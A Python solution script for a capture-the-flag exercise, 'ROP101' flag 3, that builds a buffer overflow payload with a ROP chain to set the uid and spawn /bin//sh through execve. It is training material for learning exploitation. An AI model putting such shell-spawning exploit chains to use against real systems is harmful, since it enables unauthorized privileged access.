"""Get flag 3 of ROP101 - Chaining multiple returns (ROP chain)
Author: Eugene Kolodenker <eugene@eugenekolo.com>
"""
import struct
import telnetlib

def p(x):
    return struct.pack('<L', x)

let_me_help_you = 0x804889b

# Flag 3
payload = ""
payload += "P"*112  # Add the padding leading to the overflow

# First set uid
payload += p(let_me_help_you)

# Following was auto-generated using rop-gadget
payload += p(0x0806ee7a) # pop edx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080b7fc6) # pop eax ; ret
payload += '/bin'
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x0806ee7a) # pop edx ; ret
payload += p(0x080ea064) # @ .data + 4
payload += p(0x080b7fc6) # pop eax ; ret
payload += '//sh'
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x0806ee7a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049413) # xor eax, eax ; ret
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x080481c9) # pop ebx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080de7ed) # pop ecx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x0806ee7a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049413) # xor eax, eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x08056d6b) # inc eax ; ret
payload += p(0x0806ca15) # int 0x80

print(payload)
